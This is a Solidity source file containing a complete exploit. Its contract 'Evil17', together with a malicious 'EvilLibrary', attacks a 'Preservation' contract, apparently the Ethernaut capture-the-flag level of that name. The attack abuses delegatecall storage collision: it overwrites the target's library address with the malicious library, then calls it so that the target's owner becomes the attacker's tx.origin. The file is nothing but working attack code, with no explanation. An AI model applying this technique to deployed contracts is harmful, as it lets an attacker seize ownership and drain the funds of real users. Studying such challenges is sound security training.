// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";
import "hardhat/console.sol";

contract Evil17 {
    Preservation target;
    EvilLibrary evilLib;

    constructor(address _target) {
        target = Preservation(_target);
        evilLib = new EvilLibrary();
    }

    function hack() external {
        uint256 payload = addressToUint(address(evilLib));
        target.setSecondTime(payload);
        target.setFirstTime(1);
    }

    function addressToUint(address _convert) internal pure returns (uint256) {
        return uint256(uint160(_convert));
    }
}

contract EvilLibrary {
    // stores a timestamp
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
        owner = tx.origin;
    }
}
